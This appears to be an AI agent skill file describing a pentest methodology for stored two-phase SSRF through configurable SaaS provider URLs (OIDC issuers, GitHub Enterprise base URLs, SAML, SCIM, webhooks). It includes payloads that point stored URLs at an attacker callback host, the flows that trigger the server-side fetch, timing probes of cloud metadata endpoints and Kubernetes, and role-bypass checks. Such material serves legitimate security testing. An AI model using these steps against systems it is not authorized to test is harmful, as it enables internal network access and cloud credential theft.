---
name: saas-provider-url-ssrf
description: "Two-phase SSRF via configurable provider URLs in SaaS integrations (SSO OIDC issuers, Git server base URLs, OAuth hosts). Use when target has configurable SSO, VCS, OAuth, SAML, SCIM, or data warehouse integrations where admin stores a URL and a separate flow triggers a server-side fetch."
---

# SaaS Provider URL SSRF

SaaS platforms that allow admins to configure external provider URLs create stored SSRF primitives. The server-side fetch happens not at configuration time, but when a separate downstream flow triggers it.

## Core Pattern

```
Phase 1: STORE -- Admin mutation saves attacker URL in config
Phase 2: TRIGGER -- Separate flow makes server fetch from stored URL
```

The trigger and the store are different code paths, often different auth levels.

## 1. Identify Stored URL Fields

Search client-side JS for mutations/APIs that accept URL-like parameters:

```
issuer, customBaseUrl, host, baseUrl, metadataUrl, endpoint,
providerUrl, serverUrl, instanceUrl, callbackUrl, webhookUrl,
registryUrl, apiEndpoint, serviceUrl, idpUrl, samlMetadataUrl
```

Focus on configuration mutations, not transient request parameters. The URL must be persisted server-side.

## 2. Store the Payload

Set the URL to an OOB callback server:

```bash
# OIDC SSO issuer
{"issuer": "https://ATTACKER.oob.example.com/callback", ...}

# GitHub Enterprise Server base URL
{"customBaseUrl": "https://ATTACKER.oob.example.com/callback", ...}
```

Verify the URL is stored by reading back the config.

## 3. Find and Fire the Trigger

| Stored URL | Trigger | Server Fetches | Method |
|---|---|---|---|
| OIDC issuer | SSO login flow | `{issuer}/.well-known/openid-configuration` | GET |
| GHES customBaseUrl | OAuth code exchange | `{customBaseUrl}/login/oauth/access_token` | POST |
| SAML metadata URL | SAML login initiation | `{metadataUrl}` | GET |
| SCIM endpoint | Directory sync trigger | `{scimEndpoint}/Users` | GET/POST |
| Webhook URL | Event trigger | `{webhookUrl}` | POST |
| Databricks host | OAuth token exchange | `{host}/oidc/v1/token` | POST |

### Trigger Authentication

Some triggers require valid session state (nonces, PKCE verifiers). Get these from the same API before triggering.

Some triggers are unauthenticated:
```bash
# OIDC SSO: anyone can visit /auth/{orgId}/sso -- no cookies needed
```

## 4. Confirm Impact

### OOB Callback

Look for: server IP (not client IP), library user-agent, internal headers.

### Timing Oracle for Internal Services

```bash
# Reachable internal service: ~0.05-0.2s
# Unreachable/filtered host: ~3-30s (TCP timeout)

# Key internal targets:
# 169.254.169.254 -- AWS IMDS
# 169.254.170.2 -- AWS ECS task metadata
# kubernetes.default.svc:443 -- K8s API
# localhost:{port} -- co-located services
```

### POST vs GET SSRF

POST-based SSRF (OAuth token exchange) is more impactful:
- Attacker controls JSON body fields (client_id, client_secret, code)
- Can interact with internal APIs that only accept POST

## 5. Authorization Testing

The store mutation is often admin-only. Always check lower roles:
```bash
# Test each SSRF-relevant mutation with non-admin session
# FORBIDDEN = admin-only (PR:H in CVSS)
# ISE = authorized and processed (potential lower-priv SSRF)
```

## Common Pitfalls

- **Testing store without trigger**: URL is saved but no outbound request happens. You must find the separate trigger.
- **Stale nonces**: OAuth state/nonce is single-use. Get a fresh one before each trigger.
- **Confusing client-side routes with server-side handlers**: Check if the callback route is client-side or server-side in the source.

## Related Skills

- **ssrf-ip-filter-bypass** -- Bypass URL/IP validation on the fetch
- **blind-ssrf-chains** -- Exploit SSRF when response is not returned
